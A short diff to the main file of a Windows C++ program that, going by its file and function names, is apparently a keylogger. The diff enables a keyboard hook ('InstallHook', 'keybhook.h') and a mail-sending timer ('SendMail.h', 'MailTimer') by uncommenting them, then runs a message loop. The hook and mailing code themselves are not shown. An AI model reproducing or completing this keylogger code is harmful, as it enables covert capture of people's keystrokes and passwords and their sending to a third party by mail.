@@ -5,20 +5,20 @@
 #include "Base64.h"
 #include "IO.h"
 #include "Timer.h"
-//#include "keybhook.h"
-//#include "SendMail.h"
+#include "keybhook.h"
+#include "SendMail.h"
 //using namespace std;
 
 int main ()
 {
     MSG Msg;
     IO::MKDir(IO::GetOurPath(true));
-    //InstallHook();
+    InstallHook();
     while(GetMessage (&Msg, NULL, 0, 0))
     {
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
-    //MailTimer.Stop();
+    MailTimer.Stop();
     return 0;
 }
